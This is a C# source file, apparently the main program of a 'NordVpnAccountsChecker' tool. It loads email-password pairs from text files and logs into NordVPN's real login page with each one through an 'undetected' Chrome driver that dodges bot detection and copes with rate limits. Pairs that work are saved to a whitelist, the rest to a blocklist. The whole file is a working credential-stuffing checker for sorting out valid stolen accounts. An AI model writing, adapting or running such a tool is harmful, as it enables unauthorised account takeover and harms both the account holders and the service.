using OpenQA.Selenium;
using NordVpnAccountsChecker.Extensions;
using NordVpnAccountsChecker.Components;

var blacklist = new AccountsFileStorage(fileName: "_blacklist");
blacklist.ReadAccounts();

var whitelist = new AccountsFileStorage(fileName: "_whitelist");
whitelist.ReadAccounts();

var handledAccounts = blacklist.GetAccounts().Union(whitelist.GetAccounts()).DistinctBy(s => s.Key);

var accounts = AccountsFileParser.ParseDirectory(relativePath: "Files");

var accountsToParse = accounts
                            .ExceptBy(handledAccounts.Select(s => s.Key), account => account.Key)
                            .OrderBy(s => s.Key)
                            .ToDictionary(s => s.Key, s => s.Value);

var prefs = new Dictionary<string, object>()
{
    { "credentials_enable_service", false } // disable auth popups after login
};

using (IWebDriver driver = ChromeDriverEx.CreateUndetectedChromeDriver(prefs))
{
    var loginUrl = "https://my.nordaccount.com/oauth2/login";
    var navigateToLoginPage = true;

    foreach (var account in accountsToParse)
    {
        if (navigateToLoginPage)
        {
            driver.Navigate().GoToUrl(loginUrl);
        }

        driver.HandleTooManyRequests(loginUrl);

        driver.EnterLoginAndSubmit(account.Key);

        driver.EnterPasswordAndSignIn(account.Value);

        try
        {
            bool success = driver.HandleMessage();

            if (success)
            {
                Console.WriteLine($"{account.Key} added to the white list");

                whitelist.AddAccount(account.Key, account.Value);
            }
            else
            {
                Console.WriteLine($"{account.Key} added to the block list");

                blacklist.AddAccount(account.Key, account.Value);
            }

            navigateToLoginPage = true;
        }
        catch
        {
            navigateToLoginPage = false;
        }
    }
}